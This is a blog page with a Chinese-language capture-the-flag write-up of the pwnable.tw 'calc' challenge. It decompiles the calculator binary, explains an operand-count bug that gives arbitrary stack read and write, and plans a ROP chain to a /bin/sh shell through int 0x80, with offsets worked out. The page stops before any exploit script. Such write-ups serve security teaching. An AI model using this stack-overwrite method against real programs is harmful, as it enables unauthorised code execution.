@@ -1,0 +1,961 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwnable.tw,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="查看文件基本信息1234567v1cky@ubuntu:~/Desktop/pwnable/calc$ checksec calc.dms[*] &apos;/home/v1cky/Desktop/pwnable/calc/calc.dms&apos;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found">
+<meta name="keywords" content="pwnable.tw">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwnable.tw calc writeup">
+<meta property="og:url" content="https://v1ckydxp.github.io/archives/2019/04/25/pwnable-tw-calc-writeup/index.html">
+<meta property="og:site_name" content="v1cky&#39;blog">
+<meta property="og:description" content="查看文件基本信息1234567v1cky@ubuntu:~/Desktop/pwnable/calc$ checksec calc.dms[*] &apos;/home/v1cky/Desktop/pwnable/calc/calc.dms&apos;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://v1ckydxp.github.io/images/stack.jpg">
+<meta property="og:updated_time" content="2019-07-11T00:59:14.725Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="pwnable.tw calc writeup">
+<meta name="twitter:description" content="查看文件基本信息1234567v1cky@ubuntu:~/Desktop/pwnable/calc$ checksec calc.dms[*] &apos;/home/v1cky/Desktop/pwnable/calc/calc.dms&apos;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found">
+<meta name="twitter:image" content="https://v1ckydxp.github.io/images/stack.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://v1ckydxp.github.io/archives/2019/04/25/pwnable-tw-calc-writeup/">
+
+
+
+
+
+  <title>pwnable.tw calc writeup | v1cky'blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">v1cky'blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">few words,many deeds!</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://v1ckydxp.github.io/archives/2019/04/25/pwnable-tw-calc-writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="v1cky01dxp">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="v1cky'blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">pwnable.tw calc writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-25T19:45:00+08:00">
+                2019-04-25
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Post modified&#58;</span>
+              
+              <time title="Post modified" itemprop="dateModified" datetime="2019-07-11T08:59:14+08:00">
+                2019-07-11
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/二进制/" itemprop="url" rel="index">
+                    <span itemprop="name">二进制</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  1.8k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  8
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="查看文件基本信息"><a href="#查看文件基本信息" class="headerlink" title="查看文件基本信息"></a>查看文件基本信息</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">v1cky@ubuntu:~/Desktop/pwnable/calc$ checksec calc.dms</span><br><span class="line">[*] <span class="string">'/home/v1cky/Desktop/pwnable/calc/calc.dms'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>文件开启了canary保护和栈不可执行保护。32位程序</p>
+</blockquote>
+<h3 id="分析程序行为"><a href="#分析程序行为" class="headerlink" title="分析程序行为"></a>分析程序行为</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">v1cky@ubuntu:~/Desktop/pwnable/calc$ ./calc.dms</span><br><span class="line">=== Welcome to SECPROG calculator ===</span><br><span class="line">1+1</span><br><span class="line">2</span><br><span class="line">+1</span><br><span class="line">1</span><br><span class="line">asd</span><br><span class="line">Merry Christmas!</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>就是一个计算器，输入如何不是数字或者运算符，程序退出。</p>
+</blockquote>
+<h3 id="IDA分析代码逻辑"><a href="#IDA分析代码逻辑" class="headerlink" title="IDA分析代码逻辑"></a>IDA分析代码逻辑</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ssignal(<span class="number">14</span>, timeout);</span><br><span class="line">  alarm(<span class="number">60</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"=== Welcome to SECPROG calculator ==="</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  calc();</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Merry Christmas!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>前面是个定时器，重点在于calc函数。继续跟进calc函数，查看代码逻辑。</p>
+</blockquote>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">calc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> pool; <span class="comment">// [esp+18h] [ebp-5A0h]</span></span><br><span class="line">  <span class="keyword">int</span> v2[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-59Ch]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1ACh] [ebp-40Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [esp+5ACh] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    bzero(&amp;s, <span class="number">0x400</span>u);</span><br><span class="line">    <span class="keyword">if</span> ( !get_expr((<span class="keyword">int</span>)&amp;s, <span class="number">1024</span>) )<span class="comment">//获取输入，并且判断是不是数字和运算符，否则退出</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    init_pool(&amp;pool);</span><br><span class="line">    <span class="keyword">if</span> ( parse_expr((<span class="keyword">int</span>)&amp;s, &amp;pool) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;unk_80BF804, v2[pool - <span class="number">1</span>]);</span><br><span class="line">      fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<ol>
+<li>get_expr()函数的作用是获取输入，并且过滤掉输入中不是数字和运算符的字符，并保存数字和运算符在字符串s中，长度限制在1024.</li>
+<li>pool存放表达式中的数字并且存放最终计算的结果。</li>
+<li>parse_expr()是解析表达式的函数。继续跟进分析。</li>
+</ol>
+</blockquote>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __<span class="function">cdecl <span class="title">parse_expr</span><span class="params">(<span class="keyword">int</span> expr, _DWORD *num_pool)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// ST2C_4</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> pre_ptr; <span class="comment">// [esp+20h] [ebp-88h]  //记录上次遍历的位置</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+24h] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">int</span> num_Operator; <span class="comment">// [esp+28h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> *temp_number; <span class="comment">// [esp+30h] [ebp-78h]</span></span><br><span class="line">  <span class="keyword">int</span> number; <span class="comment">// [esp+34h] [ebp-74h]  //保存当前遇到的数字</span></span><br><span class="line">  <span class="keyword">char</span> operater[<span class="number">100</span>]; <span class="comment">// [esp+38h] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v11; <span class="comment">// [esp+9Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v11 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  pre_ptr = expr;</span><br><span class="line">  num_Operator = <span class="number">0</span>;</span><br><span class="line">  bzero(operater, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(*(<span class="keyword">char</span> *)(i + expr) - <span class="string">'0'</span>) &gt; <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = i + expr - pre_ptr;</span><br><span class="line">      temp_number = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(v2 + <span class="number">1</span>);</span><br><span class="line">      <span class="built_in">memcpy</span>(temp_number, pre_ptr, v2);</span><br><span class="line">      temp_number[v2] = <span class="number">0</span>;                      <span class="comment">// 保存遇到运算符之前的数字</span></span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(temp_number, <span class="string">"0"</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"prevent division by zero"</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      number = atoi(temp_number);</span><br><span class="line">      <span class="keyword">if</span> ( number &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = (*num_pool)++;                     <span class="comment">// num_pool中保存的是该表达式中的数字，而num_pool[0]存放的是数字的个数，没次得到一个数字，num_pool[0]++，</span></span><br><span class="line">        num_pool[v4 + <span class="number">1</span>] = number;              <span class="comment">// 首先得到当前数字的个数，然后加一，作为索引放置当前得到的数字</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(i + expr) &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(*(<span class="keyword">char</span> *)(i + <span class="number">1</span> + expr) - <span class="string">'0'</span>) &gt; <span class="number">9</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"expression error!"</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      pre_ptr = i + <span class="number">1</span> + expr;</span><br><span class="line">      <span class="keyword">if</span> ( operater[num_Operator] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">switch</span> ( *(<span class="keyword">char</span> *)(i + expr) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">'%'</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">'*'</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">'/'</span>:</span><br><span class="line">            <span class="keyword">if</span> ( operater[num_Operator] != <span class="string">'+'</span> &amp;&amp; operater[num_Operator] != <span class="string">'-'</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              eval(num_pool, operater[num_Operator]);</span><br><span class="line">              operater[num_Operator] = *(_BYTE *)(i + expr);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              operater[++num_Operator] = *(_BYTE *)(i + expr);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">'+'</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">'-'</span>:</span><br><span class="line">            eval(num_pool, operater[num_Operator]);</span><br><span class="line">            operater[num_Operator] = *(_BYTE *)(i + expr);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">default</span>:</span><br><span class="line">            eval(num_pool, operater[num_Operator--]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        operater[num_Operator] = *(_BYTE *)(i + expr);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !*(_BYTE *)(i + expr) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( num_Operator &gt;= <span class="number">0</span> )</span><br><span class="line">    eval(num_pool, operater[num_Operator--]);   <span class="comment">// num_pool存放数字，operater存放运算符</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<ol>
+<li>if ( (unsigned int)(<em>(char </em>)(i + expr) - ‘0’) &gt; 9 )：该函数是一直从字符串表达式expr从头开始解析，直到遇到运算符，把之前的都看作是一个数字。该句代码就是判断当前字符是不是运算符。</li>
+<li>接下来就是将遇到的数字保存到num_pool中，其中下面两句代码很关键：<ol>
+<li>v4 = (*num_pool)++;                     // num_pool中保存的是该表达式中的数字，而num_pool[0]存放的是数字的个数，每次得到一个数字，num_pool[0]++，</li>
+<li>num_pool[v4 + 1] = number;              // 首先得到当前数字的个数，然后加一，作为索引放置当前得到的数字</li>
+</ol>
+</li>
+<li>在往下走，就是 if ( operater[num_Operator] )判断语句。里面就是进行运算操作，但整个程序的最终运算实在eval()函数。继续跟进eval()函数。</li>
+</ol>
+</blockquote>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__<span class="function">cdecl <span class="title">eval</span><span class="params">(_DWORD *number, <span class="keyword">char</span> operater)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( operater == <span class="string">'+'</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    number[*number - <span class="number">1</span>] += number[*number];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( operater &gt; <span class="string">'+'</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( operater == <span class="string">'-'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      number[*number - <span class="number">1</span>] -= number[*number];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( operater == <span class="string">'/'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      number[*number - <span class="number">1</span>] /= number[*number];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( operater == <span class="string">'*'</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    number[*number - <span class="number">1</span>] *= number[*number];</span><br><span class="line">  &#125;</span><br><span class="line">  result = number;</span><br><span class="line">  --*number;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<ol>
+<li><p>number数组存放的是表达式中的所有数字，number[0]是所有数字的数量。operater数组存放的是运算符。</p>
+</li>
+<li><p>运算的逻辑是，每次读取一个运算符，取出number数组中最后两个数，计算后将数保存到number数组倒数第二位上，然后将number[0]减一。</p>
+</li>
+<li><p>这里存在一个问题，</p>
+<ol>
+<li>若输入的表达式是’+100’，那么此时，number[0]=1,number[1]=100,计算之后</li>
+</ol>
+<p>number[0]=101，然后—*number，即最后number[0]=100，然后继续，输入表达式’+100+2’，由于第一次计算后number[0]=100，那么第二次计算就是number[number[0]-1] += number[1] ==&gt; number[100] += number[1] ==&gt; number[100] +=2，最后将结果保存在number[100]并输出，造成了栈上任意地址读写。</p>
+</li>
+</ol>
+</blockquote>
+<blockquote>
+<p>回到calc()函数，由于pool可控。</p>
+</blockquote>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( parse_expr((<span class="keyword">int</span>)&amp;s, &amp;pool) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%d"</span>, v2[pool - <span class="number">1</span>]); <span class="comment">//pool就是存放数组的数字，即number数组</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">080493</span>ED                 call    parse_expr</span><br><span class="line">.text:<span class="number">080493F</span>2                 test    eax, eax</span><br><span class="line">.text:<span class="number">080493F</span>4                 jz      <span class="keyword">short</span> loc_8049428</span><br><span class="line">.text:<span class="number">080493F</span>6                 mov     eax, [ebp+pool]</span><br><span class="line">.text:<span class="number">080493F</span>C                 sub     eax, <span class="number">1</span></span><br><span class="line">.text:<span class="number">080493F</span>F                 mov     eax, [ebp+eax*<span class="number">4</span>+var_59C]</span><br></pre></td></tr></table></figure>
+<blockquote>
+<ol>
+<li>Mov eax,[ebp+pool]是数组的第一个值， mov     eax, [ebp+eax*4+var_59C]，然后将其减1再乘以4之后加上0x59c作为栈的偏移取值进行输出，通过前面部分我们知道这里的eax是我们可以控制的，因此到这里我们就能够在栈上任意读写了。</li>
+<li>init_pool中新开辟的空间保存操作数，开始位置保存操作数的个数；parse_expr新开辟的空间保存运算符；number[*number]保存最终结果。</li>
+</ol>
+</blockquote>
+<h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>通过上面的分析，操作数字符串的起始位置在ebp+var_5A0处，函数栈如下所示：</p>
+<table>
+<thead>
+<tr>
+<th>addr</th>
+<th>stack</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>ebp+5A0</td>
+<td>Pool(存放操作数个数，number[0])</td>
+</tr>
+<tr>
+<td>ebp+59C</td>
+<td>v2(从此位置依次存放操作数)</td>
+</tr>
+<tr>
+<td>…..</td>
+<td></td>
+</tr>
+<tr>
+<td>…..</td>
+<td></td>
+</tr>
+<tr>
+<td>ebp</td>
+<td>ebp</td>
+</tr>
+<tr>
+<td>ebp-4</td>
+<td>ret</td>
+</tr>
+</tbody>
+</table>
+<p>计算pool到返回地址的距离：0x5A0+0x4 = 1444;1444/4 = 361,即number[361]保存函数返回地址。输入’+361’时返回值number[0]=361，下一次输入表达式即可修改number[361]处的值，也就是函数返回地址。比如下次输入’+361+1’，计算流程如下：</p>
+<ol>
+<li>v4 = number = 361;*number++;</li>
+<li>number[362] = 1;</li>
+<li>number[number[0]-1] += number[number[0]]==&gt; number[361] += number[362];</li>
+</ol>
+<p>所以我们需要连续修改number[361]之后的一段栈空间来构造ROP。</p>
+<p>由于该程序是属于静态链接，不能用ret2libc思路来做，这里利用的思路是通过修改eax,ebx,ecx的值并通过Int 80进行系统调用getshell。最终的栈空间布置如下：</p>
+<p><img src="/images/stack.jpg" alt="stack"></p>
+<p>由于我们需要知道字符串”/bin/sh”在栈中的地址而不是偏移。如图可以看到a2[360]可以泄露old ebp的地址，在mian函数的函数栈中，上一个函数调用栈的esp的值首先保存在ebp中，然后将esp&amp;0fffffffh-0x10h得到main-esp也就是calc函数的返回地址，也就是a2[361]。</p>
